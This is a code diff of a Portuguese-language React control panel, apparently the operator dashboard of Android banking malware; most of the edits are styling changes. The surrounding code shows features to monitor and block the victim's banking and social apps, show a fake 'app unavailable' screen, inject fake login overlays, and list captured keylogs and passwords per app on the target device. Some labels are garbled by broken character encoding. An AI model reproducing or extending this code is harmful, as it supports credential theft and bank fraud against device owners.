-                      className={`px-3 py-1.5 rounded-xl font-bold transition-all ${appsFilter === 'all' ? 'bg-emerald-500/20 border border-emerald-500/50 text-emerald-400' : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-white'}`}
+                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'all' ? 'bg-emerald-500/20 border border-emerald-500/50 text-emerald-400' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                     >
                       Todos ({installedApps.length})
                     </button>
                     <button
                       onClick={() => setAppsFilter('banks')}
-                      className={`px-3 py-1.5 rounded-xl font-bold transition-all ${appsFilter === 'banks' ? 'bg-orange-500/20 border border-orange-500/50 text-orange-400' : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-white'}`}
+                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'banks' ? 'bg-[#ef4444]/20 border border-[#ef4444]/50 text-[#f87171]' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                     >
                        Bancos ({installedBanks.length})
                     </button>
                     <button
                       onClick={() => setAppsFilter('social')}
-                      className={`px-3 py-1.5 rounded-xl font-bold transition-all ${appsFilter === 'social' ? 'bg-pink-500/20 border border-pink-500/50 text-pink-400' : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-white'}`}
+                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'social' ? 'bg-pink-500/20 border border-pink-500/50 text-pink-400' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                     >
-                      💬 Redes Sociais ({installedApps.filter(a => isSocialApp(a.package)).length})
+                       Redes Sociais ({installedApps.filter(a => isSocialApp(a.package)).length})
                     </button>
                     <button
                       onClick={() => setAppsFilter('user')}
-                      className={`px-3 py-1.5 rounded-xl font-bold transition-all ${appsFilter === 'user' ? 'bg-cyan-500/20 border border-cyan-500/50 text-cyan-400' : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-white'}`}
+                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'user' ? 'bg-[#ef4444]/20 border border-[#2a2a31]/50 text-[#ef4444]' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                     >
-                      👤 Usuário
+                       Usuário
                     </button>
                     <button
                       onClick={() => setAppsFilter('system')}
-                      className={`px-3 py-1.5 rounded-xl font-bold transition-all ${appsFilter === 'system' ? 'bg-purple-500/20 border border-purple-500/50 text-purple-400' : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-white'}`}
+                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'system' ? 'bg-[#f87171]/20 border border-[#f87171]/50 text-[#f87171]' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                     >
-                      š™ Sistema
+                      š Sistema
                     </button>
                     <button
                       onClick={() => setAppsFilter('monitored' as any)}
-                      className={`px-3 py-1.5 rounded-xl font-bold transition-all ${appsFilter === ('monitored' as any) ? 'bg-amber-500/20 border border-amber-500/50 text-amber-400' : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-white'}`}
+                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === ('monitored' as any) ? 'bg-amber-500/20 border border-amber-500/50 text-amber-400' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                     >
-                      🔔 Monitorados ({monitoredAlertPkgs.length})
+                       Monitorados ({monitoredAlertPkgs.length})
                     </button>
                     <button
                       onClick={() => setAppsFilter('blocked')}
-                      className={`px-3 py-1.5 rounded-xl font-bold transition-all ${appsFilter === 'blocked' ? 'bg-red-500/20 border border-red-500/50 text-red-400' : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-white'}`}
+                      className={`px-3 py-1.5 rounded-md font-bold transition-all ${appsFilter === 'blocked' ? 'bg-[#ef4444]/20 border border-[#2a2a31]/50 text-[#ef4444]' : 'bg-[#121214]/60 border border-[#24242a] text-slate-400 hover:text-white'}`}
                     >
-                      🚫 Impedir Abertura ({blockedApps.length})
+                       Impedir Abertura ({blockedApps.length})
                     </button>
                   </div>
 
                   <input
                     type="text"
-                    placeholder="” Buscar aplicativo..."
+                    placeholder=" Buscar aplicativo..."
                     value={appsSearch}
                     onChange={(e) => setAppsSearch(e.target.value)}
-                    className="w-full sm:w-64 px-3 py-1.5 bg-slate-900/90 border border-blue-500/30 rounded-xl text-xs text-white placeholder-slate-500 focus:outline-none focus:border-emerald-400"
+                    className="w-full sm:w-64 px-3 py-1.5 bg-[#121214]/90 border border-[#2a2a31]/30 rounded-md text-xs text-white placeholder-[#8b8b94] focus:outline-none focus:border-emerald-400"
                   />
                 </div>
 
                 {/* Barra de Presets Rápidos do Monitoramento */}
                 {appsFilter === ('monitored' as any) && (
-                  <div className="mb-3 p-3 bg-gradient-to-r from-amber-950/40 via-[#380b03] to-slate-900 border border-amber-500/40 rounded-2xl flex flex-wrap items-center justify-between gap-2 shadow-[0_0_20px_rgba(245,158,11,0.15)]">
+                  <div className="mb-3 p-3 bg-gradient-to-r from-amber-950/40 via-[#121214] to-[#121214] border border-amber-500/40 rounded-md flex flex-wrap items-center justify-between gap-2 shadow-[0_0_20px_rgba(245,158,11,0.15)]">
                     <div className="flex items-center gap-2">
-                      <span className="p-1.5 bg-amber-500/20 rounded-xl text-amber-400 border border-amber-500/30 text-sm">🎯</span>
+                      <span className="p-1.5 bg-amber-500/20 rounded-md text-amber-400 border border-amber-500/30 text-sm"></span>
                       <div>
                         <h4 className="text-xs font-black text-amber-300 uppercase tracking-wider font-mono">Central de Monitoramento de Apps</h4>
                         <p className="text-[10px] text-slate-400 font-mono">Receba alertas em tempo real e acompanhe digitações por aplicativo</p>
@@ -5480,22 +5544,22 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     <div className="flex items-center gap-1.5 flex-wrap text-xs">
                       <button
                         onClick={autoMonitorAllBanks}
-                        className="px-2.5 py-1.5 bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-black font-extrabold rounded-xl text-[11px] uppercase tracking-wider transition-all shadow-md cursor-pointer flex items-center gap-1"
+                        className="px-2.5 py-1.5 bg-gradient-to-r from-amber-600 to-[#84cc16] hover:from-amber-500 hover:to-[#ef4444] text-black font-extrabold rounded-md text-[11px] uppercase tracking-wider transition-all shadow-md cursor-pointer flex items-center gap-1"
                       >
-                        ⚡ Monitorar Todos os Bancos ({installedBanks.length})
+                         Monitorar Todos os Bancos ({installedBanks.length})
                       </button>
                       <button
                         onClick={autoMonitorAllSocial}
-                        className="px-2.5 py-1.5 bg-pink-900/60 hover:bg-pink-800 text-pink-200 border border-pink-500/40 font-bold rounded-xl text-[11px] transition-all cursor-pointer flex items-center gap-1"
+                        className="px-2.5 py-1.5 bg-pink-900/60 hover:bg-pink-800 text-pink-200 border border-pink-500/40 font-bold rounded-md text-[11px] transition-all cursor-pointer flex items-center gap-1"
                       >
-                        💬 Monitorar Redes Sociais
+                         Monitorar Redes Sociais
                       </button>
                       {monitoredAlertPkgs.length > 0 && (
                         <button
                           onClick={clearMonitoredApps}
-                          className="px-2.5 py-1.5 bg-slate-800 hover:bg-red-900/60 text-slate-400 hover:text-red-300 border border-slate-700 rounded-xl text-[11px] transition-all cursor-pointer"
+                          className="px-2.5 py-1.5 bg-[#24242a] hover:bg-[#1a1a1e]/60 text-slate-400 hover:text-[#ef4444] border border-[#2a2a31] rounded-md text-[11px] transition-all cursor-pointer"
                         >
-                          🧹 Limpar Lista
+                           Limpar Lista
                         </button>
                       )}
                     </div>
@@ -5504,11 +5568,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                 {/* Barra de Presets Rápidos do Bloqueio (Tela Indisponível) */}
                 {appsFilter === 'blocked' && (
-                  <div className="mb-3 p-3 bg-gradient-to-r from-red-950/50 via-[#180918] to-slate-900 border border-red-500/40 rounded-2xl flex flex-wrap items-center justify-between gap-2 shadow-[0_0_20px_rgba(239,68,68,0.15)]">
+                  <div className="mb-3 p-3 bg-gradient-to-r from-[#121214]/50 via-[#180918] to-[#121214] border border-[#2a2a31]/40 rounded-md flex flex-wrap items-center justify-between gap-2 shadow-[0_0_20px_rgba(239,68,68,0.15)]">
                     <div className="flex items-center gap-2">
-                      <span className="p-1.5 bg-red-500/20 rounded-xl text-red-400 border border-red-500/30 text-sm">🚫</span>
+                      <span className="p-1.5 bg-[#ef4444]/20 rounded-md text-[#ef4444] border border-[#2a2a31]/30 text-sm"></span>
                       <div>
-                        <h4 className="text-xs font-black text-red-300 uppercase tracking-wider font-mono">Central de Bloqueio (Impedir Abertura)</h4>
+                        <h4 className="text-xs font-black text-[#ef4444] uppercase tracking-wider font-mono">Central de Bloqueio (Impedir Abertura)</h4>
                         <p className="text-[10px] text-slate-400 font-mono">Exibe uma tela falsa de "Aplicativo Indisponível" ao abrir apps impedidos</p>
                       </div>
                     </div>
@@ -5516,28 +5580,28 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     <div className="flex items-center gap-1.5 flex-wrap text-xs">
                       <button
                         onClick={blockAllBanks}
-                        className="px-2.5 py-1.5 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-extrabold rounded-xl text-[11px] uppercase tracking-wider transition-all shadow-md cursor-pointer flex items-center gap-1"
+                        className="px-2.5 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#84cc16] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] font-extrabold rounded-md text-[11px] uppercase tracking-wider transition-all shadow-md cursor-pointer flex items-center gap-1"
                       >
-                        🚫 Bloquear Todos os Bancos ({installedBanks.length})
+                         Bloquear Todos os Bancos ({installedBanks.length})
                       </button>
                       <button
                         onClick={blockAllSocial}
-                        className="px-2.5 py-1.5 bg-pink-900/60 hover:bg-pink-800 text-pink-200 border border-pink-500/40 font-bold rounded-xl text-[11px] transition-all cursor-pointer flex items-center gap-1"
+                        className="px-2.5 py-1.5 bg-pink-900/60 hover:bg-pink-800 text-pink-200 border border-pink-500/40 font-bold rounded-md text-[11px] transition-all cursor-pointer flex items-center gap-1"
                       >
-                        💬 Bloquear Redes Sociais
+                         Bloquear Redes Sociais
                       </button>
                       <button
                         onClick={() => testAppUnavailableScreen('com.android.settings', 'Configurações')}
-                        className="px-2.5 py-1.5 bg-amber-600/80 hover:bg-amber-500 text-white font-bold rounded-xl text-[11px] transition-all cursor-pointer flex items-center gap-1"
+                        className="px-2.5 py-1.5 bg-amber-600/80 hover:bg-amber-500 text-white font-bold rounded-md text-[11px] transition-all cursor-pointer flex items-center gap-1"
                       >
-                        🧪 Testar Tela Indisponível
+                         Testar Tela Indisponível
                       </button>
                       {blockedApps.length > 0 && (
                         <button
                           onClick={clearBlockedApps}
-                          className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 rounded-xl text-[11px] transition-all cursor-pointer"
+                          className="px-2.5 py-1.5 bg-[#24242a] hover:bg-[#2a2a31] text-slate-300 border border-[#2a2a31] rounded-md text-[11px] transition-all cursor-pointer"
                         >
-                          🧹 Desbloquear Todos
+                           Desbloquear Todos
                         </button>
                       )}
                     </div>
@@ -5552,7 +5616,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     if (appsFilter === 'social') return isSocialApp(app.package);
                     return true;
                   }).length === 0 ? (
-                    <div className="py-14 text-center text-slate-500 bg-[#210603]/60 rounded-2xl border border-blue-500/20 p-6">
+                    <div className="py-14 text-center text-[#8b8b94] bg-[#210603]/60 rounded-md border border-[#2a2a31]/20 p-6">
                       <div className="w-16 h-16 bg-amber-500/10 rounded-full flex items-center justify-center mx-auto mb-3 border border-amber-500/30 shadow-[0_0_20px_rgba(245,158,11,0.2)]">
                         <Bell className="w-8 h-8 text-amber-400 animate-bounce" />
                       </div>
@@ -5570,15 +5634,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         <div className="flex items-center justify-center gap-2 flex-wrap">
                           <button
                             onClick={autoMonitorAllBanks}
-                            className="px-4 py-2 bg-gradient-to-r from-amber-500 to-orange-500 text-black font-extrabold rounded-xl text-xs uppercase tracking-wider shadow-lg hover:brightness-110 transition-all cursor-pointer"
+                            className="px-4 py-2 bg-gradient-to-r from-amber-500 to-[#ef4444] text-black font-extrabold rounded-md text-xs uppercase tracking-wider shadow-lg hover:brightness-110 transition-all cursor-pointer"
                           >
-                            ⚡ Monitorar Todos os Bancos ({installedBanks.length})
+                             Monitorar Todos os Bancos ({installedBanks.length})
                           </button>
                           <button
                             onClick={autoMonitorAllSocial}
-                            className="px-4 py-2 bg-pink-900/80 hover:bg-pink-800 text-pink-200 font-bold rounded-xl text-xs border border-pink-500/40 transition-all cursor-pointer"
+                            className="px-4 py-2 bg-pink-900/80 hover:bg-pink-800 text-pink-200 font-bold rounded-md text-xs border border-pink-500/40 transition-all cursor-pointer"
                           >
-                            💬 Monitorar Redes Sociais
+                             Monitorar Redes Sociais
                           </button>
                         </div>
                       )}
@@ -5586,15 +5650,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         <div className="flex items-center justify-center gap-2 flex-wrap">
                           <button
                             onClick={blockAllBanks}
-                            className="px-4 py-2 bg-gradient-to-r from-red-600 to-rose-600 text-white font-extrabold rounded-xl text-xs uppercase tracking-wider shadow-lg hover:brightness-110 transition-all cursor-pointer"
+                            className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#84cc16] text-[#10120a] font-extrabold rounded-md text-xs uppercase tracking-wider shadow-lg hover:brightness-110 transition-all cursor-pointer"
                           >
-                            🚫 Bloquear Todos os Bancos ({installedBanks.length})
+                             Bloquear Todos os Bancos ({installedBanks.length})
                           </button>
                           <button
                             onClick={blockAllSocial}
-                            className="px-4 py-2 bg-pink-900/80 hover:bg-pink-800 text-pink-200 font-bold rounded-xl text-xs border border-pink-500/40 transition-all cursor-pointer"
+                            className="px-4 py-2 bg-pink-900/80 hover:bg-pink-800 text-pink-200 font-bold rounded-md text-xs border border-pink-500/40 transition-all cursor-pointer"
                           >
-                            💬 Bloquear Redes Sociais
+                             Bloquear Redes Sociais
                           </button>
                         </div>
                       )}
@@ -5618,12 +5682,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       return (
                         <div
                           key={index}
-                          className={`rounded-2xl transition-all border overflow-hidden ${
+                          className={`rounded-md transition-all border overflow-hidden ${
                             isBlocked
-                              ? 'bg-gradient-to-r from-red-950/30 via-[#190918] to-[#0d040e] border-red-500/60 shadow-[0_0_20px_rgba(239,68,68,0.25)]'
+                              ? 'bg-gradient-to-r from-[#121214]/30 via-[#190918] to-[#0d040e] border-[#2a2a31]/60 shadow-[0_0_20px_rgba(239,68,68,0.25)]'
                               : isMonitored
                               ? 'bg-gradient-to-r from-amber-950/20 via-[#320a03] to-[#240703] border-amber-500/50 shadow-[0_0_20px_rgba(245,158,11,0.18)]'
-                              : 'bg-slate-900/70 border-slate-800 hover:border-cyan-500/40 hover:bg-slate-900/90'
+                              : 'bg-[#121214]/70 border-[#24242a] hover:border-[#2a2a31]/40 hover:bg-[#121214]/90'
                           }`}
                         >
                           {/* Linha Principal do App */}
@@ -5634,37 +5698,37 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 <div className="flex items-center gap-2 flex-wrap mb-0.5">
                                   <span className="font-extrabold text-sm text-white truncate max-w-[220px] font-mono">{app.name}</span>
                                   {isBlocked && (
-                                    <span className="px-2 py-0.5 text-[9px] font-black uppercase tracking-wider bg-red-500/20 text-red-300 rounded-md border border-red-400/50 animate-pulse flex items-center gap-1 shadow-sm">
+                                    <span className="px-2 py-0.5 text-[9px] font-black uppercase tracking-wider bg-[#ef4444]/20 text-[#ef4444] rounded-md border border-[#3a3a44]/50 animate-pulse flex items-center gap-1 shadow-sm">
                                       <span>š«</span> INDISPONVEL
                                     </span>
                                   )}
                                   {isMonitored && (
                                     <span className="px-2 py-0.5 text-[9px] font-black uppercase tracking-wider bg-amber-500/20 text-amber-300 rounded-md border border-amber-400/50 animate-pulse flex items-center gap-1 shadow-sm">
-                                      <span>🔔</span> MONITORADO
+                                      <span></span> MONITORADO
                                     </span>
                                   )}
                                   {isSocialApp(app.package) ? (
-                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-pink-500/20 text-pink-300 rounded-md border border-pink-500/30">💬 Redes Sociais</span>
+                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-pink-500/20 text-pink-300 rounded-md border border-pink-500/30"> Redes Sociais</span>
                                   ) : installedBanks.some(b => b.package === app.package) ? (
                                     <span className="px-2 py-0.5 text-[9px] font-bold bg-amber-500/20 text-amber-300 rounded-md border border-amber-500/30"> Banco</span>
                                   ) : app.isSystem ? (
-                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-slate-800 text-slate-400 rounded-md border border-slate-700">Sistema</span>
+                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-[#24242a] text-slate-400 rounded-md border border-[#2a2a31]">Sistema</span>
                                   ) : (
-                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-cyan-500/15 text-cyan-400 rounded-md border border-cyan-500/30">Usuário</span>
+                                    <span className="px-2 py-0.5 text-[9px] font-bold bg-[#ef4444]/15 text-[#ef4444] rounded-md border border-[#2a2a31]/30">Usuário</span>
                                   )}
                                 </div>
                                 <p className="text-[10px] font-mono text-slate-400 truncate max-w-[300px]">{app.package}</p>
                                 
                                 {/* Estatísticas de Atividade */}
                                 <div className="flex items-center gap-2 mt-1.5 flex-wrap text-[10px] font-mono">
-                                  <span className={`px-2 py-0.5 rounded-full border ${appKeylogs.length > 0 ? 'bg-blue-950 text-cyan-300 border-cyan-500/30' : 'bg-slate-900 text-slate-500 border-slate-800'}`}>
+                                  <span className={`px-2 py-0.5 rounded-full border ${appKeylogs.length > 0 ? 'bg-[#121214] text-[#ef4444] border-[#2a2a31]/30' : 'bg-[#121214] text-[#8b8b94] border-[#24242a]'}`}>
                                     ¨ {appKeylogs.length} keylogs
                                   </span>
-                                  <span className={`px-2 py-0.5 rounded-full border ${appPasswords.length > 0 ? 'bg-red-950 text-red-300 border-red-500/40 font-bold' : 'bg-slate-900 text-slate-500 border-slate-800'}`}>
-                                    🔑 {appPasswords.length} senhas
+                                  <span className={`px-2 py-0.5 rounded-full border ${appPasswords.length > 0 ? 'bg-[#121214] text-[#ef4444] border-[#2a2a31]/40 font-bold' : 'bg-[#121214] text-[#8b8b94] border-[#24242a]'}`}>
+                                     {appPasswords.length} senhas
                                   </span>
-                                  <span className={`px-2 py-0.5 rounded-full border ${appNotifs.length > 0 ? 'bg-amber-950 text-amber-300 border-amber-500/30' : 'bg-slate-900 text-slate-500 border-slate-800'}`}>
-                                    🔔 {appNotifs.length} notificações
+                                  <span className={`px-2 py-0.5 rounded-full border ${appNotifs.length > 0 ? 'bg-amber-950 text-amber-300 border-amber-500/30' : 'bg-[#121214] text-[#8b8b94] border-[#24242a]'}`}>
+                                     {appNotifs.length} notificações
                                   </span>
                                 </div>
                               </div>
@@ -5674,53 +5738,53 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             <div className="flex items-center gap-1.5 flex-wrap">
                               <button
                                 onClick={() => setExpandedAppActivities(isExpanded ? null : app.package)}
-                                className={`px-3 py-1.5 rounded-xl text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
+                                className={`px-3 py-1.5 rounded-md text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
                                   isExpanded
-                                    ? 'bg-cyan-500 text-black border-cyan-300 shadow-[0_0_12px_rgba(239,68,68,0.5)]'
-                                    : 'bg-slate-800/80 hover:bg-slate-700 text-cyan-300 border-cyan-500/30'
+                                    ? 'bg-[#ef4444] text-black border-[#4a4a56] shadow-[0_0_12px_rgba(239,68,68,0.5)]'
+                                    : 'bg-[#24242a]/80 hover:bg-[#2a2a31] text-[#ef4444] border-[#2a2a31]/30'
                                 }`}
                                 title="Ver histórico de atividades e configurar ações automáticas para este app"
                               >
                                 <Eye className="w-3.5 h-3.5" />
-                                {isExpanded ? 'Fechar Painel' : '📊 Atividades & Gatilhos'}
+                                {isExpanded ? 'Fechar Painel' : ' Atividades & Gatilhos'}
                               </button>
 
                               <button
                                 onClick={() => toggleBlockApp(app.package, app.name)}
-                                className={`px-3 py-1.5 rounded-xl text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
+                                className={`px-3 py-1.5 rounded-md text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
                                   isBlocked
-                                    ? 'bg-red-600 text-white border-red-400 shadow-[0_0_12px_rgba(239,68,68,0.5)] animate-pulse'
-                                    : 'bg-slate-800 hover:bg-slate-700 text-red-300 border-red-900/50'
+                                    ? 'bg-[#ef4444] text-white border-[#3a3a44] shadow-[0_0_12px_rgba(239,68,68,0.5)] animate-pulse'
+                                    : 'bg-[#24242a] hover:bg-[#2a2a31] text-[#ef4444] border-[#1a1a1e]/50'
                                 }`}
                                 title="Impedir abertura deste app exibindo tela falsa de Aplicativo Indisponível"
                               >
-                                <ShieldAlert className={`w-3.5 h-3.5 ${isBlocked ? 'text-white' : 'text-red-400'}`} />
-                                {isBlocked ? '🚫 Indisponível' : '🚫 Impedir Abertura'}
+                                <ShieldAlert className={`w-3.5 h-3.5 ${isBlocked ? 'text-white' : 'text-[#ef4444]'}`} />
+                                {isBlocked ? ' Indisponível' : ' Impedir Abertura'}
                               </button>
 
                               <button
                                 onClick={() => toggleMonitorAppAlert(app.package, app.name)}
-                                className={`px-3 py-1.5 rounded-xl text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
+                                className={`px-3 py-1.5 rounded-md text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 border cursor-pointer ${
                                   isMonitored
                                     ? 'bg-amber-500 text-black border-amber-300 shadow-[0_0_12px_rgba(245,158,11,0.5)]'
-                                    : 'bg-slate-800 hover:bg-slate-700 text-slate-300 border-slate-700'
+                                    : 'bg-[#24242a] hover:bg-[#2a2a31] text-slate-300 border-[#2a2a31]'
                                 }`}
                                 title="Notificar no painel quando este aplicativo for aberto no dispositivo alvo"
                               >
                                 <Bell className={`w-3.5 h-3.5 ${isMonitored ? 'animate-bounce' : ''}`} />
-                                {isMonitored ? '🔔 Monitorado' : '🔔 Alertar'}
+                                {isMonitored ? ' Monitorado' : ' Alertar'}
                               </button>
 
                               <button
                                 onClick={() => openApp(app.package, app.name)}
-                                className="px-3 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white rounded-xl text-[11px] font-bold uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(16,185,129,0.2)] cursor-pointer"
+                                className="px-3 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white rounded-md text-[11px] font-bold uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(16,185,129,0.2)] cursor-pointer"
                               >
-                                –¶ Abrir
+                                ¶ Abrir
                               </button>
 
                               <button
                                 onClick={() => handleDirectDuplicate(app.package, app.name)}
-                                className="px-3 py-1.5 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white border border-cyan-400/40 rounded-xl text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 shadow-[0_0_12px_rgba(255,43,43,0.35)] cursor-pointer"
+                                className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] border border-[#3a3a44]/40 rounded-md text-[11px] font-bold uppercase tracking-wider transition-all flex items-center gap-1 shadow-[0_0_12px_rgba(239,68,68,0.35)] cursor-pointer"
                                 title="Duplicar aplicativo no dispositivo alvo"
                               >
                                 <Copy size={13} /> Duplicar
@@ -5730,10 +5794,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                           {/* Painel Expansível de Atividades e Gatilhos do App */}
                           {isExpanded && (
-                            <div className="bg-[#1a0503] border-t border-cyan-500/30 p-3 space-y-3 font-mono text-xs select-none">
-                              <div className="flex items-center justify-between border-b border-cyan-500/20 pb-2">
-                                <span className="font-bold text-cyan-300 flex items-center gap-1.5">
-                                  <Eye className="w-4 h-4 text-cyan-400" />
+                            <div className="bg-[#1a0503] border-t border-[#2a2a31]/30 p-3 space-y-3 font-mono text-xs select-none">
+                              <div className="flex items-center justify-between border-b border-[#2a2a31]/20 pb-2">
+                                <span className="font-bold text-[#ef4444] flex items-center gap-1.5">
+                                  <Eye className="w-4 h-4 text-[#ef4444]" />
                                   Painel de Atividades & Ações: {app.name}
                                 </span>
                                 <span className="text-[10px] text-slate-400 font-mono">Package: {app.package}</span>
@@ -5743,9 +5807,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px]">
                                 <button
                                   onClick={() => openApp(app.package, app.name)}
-                                  className="py-1.5 px-2 bg-emerald-950/60 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/40 rounded-xl font-bold transition-all text-center cursor-pointer"
+                                  className="py-1.5 px-2 bg-emerald-950/60 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/40 rounded-md font-bold transition-all text-center cursor-pointer"
                                 >
-                                  –¶ Abrir no Aparelho
+                                  ¶ Abrir no Aparelho
                                 </button>
                                 <button
                                   onClick={() => {
@@ -5753,38 +5817,38 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                     setEditBankLogoText(app.name);
                                     setShowEditBankScreensTab(true);
                                   }}
-                                  className="py-1.5 px-2 bg-pink-950/60 hover:bg-pink-900 text-pink-300 border border-pink-500/40 rounded-xl font-bold transition-all text-center cursor-pointer"
+                                  className="py-1.5 px-2 bg-pink-950/60 hover:bg-pink-900 text-pink-300 border border-pink-500/40 rounded-md font-bold transition-all text-center cursor-pointer"
                                 >
-                                  💉 Injetar Tela Fake
+                                   Injetar Tela Fake
                                 </button>
                                 <button
                                   onClick={() => {
                                     setShowScreenReader(true);
                                     if (!isScreenReaderEnabled) toggleScreenReader();
                                   }}
-                                  className="py-1.5 px-2 bg-cyan-950/60 hover:bg-cyan-900 text-cyan-300 border border-cyan-500/40 rounded-xl font-bold transition-all text-center cursor-pointer"
+                                  className="py-1.5 px-2 bg-[#121214]/60 hover:bg-[#1a1a1e] text-[#ef4444] border border-[#2a2a31]/40 rounded-md font-bold transition-all text-center cursor-pointer"
                                 >
-                                  📸 Ver na Tela V2
+                                   Ver na Tela V2
                                 </button>
                                 <button
                                   onClick={() => forceStopApp(app.package, app.name)}
-                                  className="py-1.5 px-2 bg-amber-950/60 hover:bg-amber-900 text-amber-300 border border-amber-500/40 rounded-xl font-bold transition-all text-center cursor-pointer"
+                                  className="py-1.5 px-2 bg-amber-950/60 hover:bg-amber-900 text-amber-300 border border-amber-500/40 rounded-md font-bold transition-all text-center cursor-pointer"
                                 >
-                                  ⛔ Forçar Parada
+                                   Forçar Parada
                                 </button>
                               </div>
 
                               {/* Histórico de Digitações (Keylogs) neste App */}
-                              <div className="bg-[#2d0903] rounded-xl p-2.5 border border-cyan-500/20 space-y-1.5">
-                                <div className="flex items-center justify-between text-[11px] font-bold text-cyan-400">
+                              <div className="bg-[#2d0903] rounded-md p-2.5 border border-[#2a2a31]/20 space-y-1.5">
+                                <div className="flex items-center justify-between text-[11px] font-bold text-[#ef4444]">
                                   <span>¨ Keylogs Registrados neste App ({appKeylogs.length})</span>
                                 </div>
                                 {appKeylogs.length === 0 ? (
-                                  <p className="text-[10px] text-slate-500 italic py-1">Nenhum texto ou tecla gravada neste aplicativo até o momento.</p>
+                                  <p className="text-[10px] text-[#8b8b94] italic py-1">Nenhum texto ou tecla gravada neste aplicativo até o momento.</p>
                                 ) : (
                                   <div className="space-y-1 max-h-32 overflow-y-auto pr-1">
                                     {appKeylogs.slice(0, 10).map((k: any, kIdx: number) => (
-                                      <div key={kIdx} className="bg-[#140303] p-1.5 rounded-lg border border-cyan-500/15 flex items-center justify-between text-[11px]">
+                                      <div key={kIdx} className="bg-[#0a0a0b] p-1.5 rounded-md border border-[#2a2a31]/15 flex items-center justify-between text-[11px]">
                                         <span className="text-white font-bold break-all">{k.text || k.data || k.value}</span>
                                         <span className="text-[9px] text-slate-400 shrink-0 ml-2">{k.timestamp ? new Date(k.timestamp).toLocaleTimeString() : ''}</span>
                                       </div>
@@ -5795,14 +5859,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                               {/* Senhas e Credenciais Capturadas para este App */}
                               {appPasswords.length > 0 && (
-                                <div className="bg-red-950/30 rounded-xl p-2.5 border border-red-500/40 space-y-1.5">
-                                  <div className="text-[11px] font-bold text-red-400 flex items-center gap-1">
-                                    <span>🔑 Senhas e Credenciais Capturadas ({appPasswords.length})</span>
+                                <div className="bg-[#121214]/30 rounded-md p-2.5 border border-[#2a2a31]/40 space-y-1.5">
+                                  <div className="text-[11px] font-bold text-[#ef4444] flex items-center gap-1">
+                                    <span> Senhas e Credenciais Capturadas ({appPasswords.length})</span>
                                   </div>
                                   <div className="space-y-1 max-h-28 overflow-y-auto pr-1">
                                     {appPasswords.map((p: any, pIdx: number) => (
-                                      <div key={pIdx} className="bg-[#110505] p-1.5 rounded-lg border border-red-500/30 flex items-center justify-between text-[11px]">
-                                        <span className="text-red-300 font-mono font-bold">{p.password || p.data || p.pin}</span>
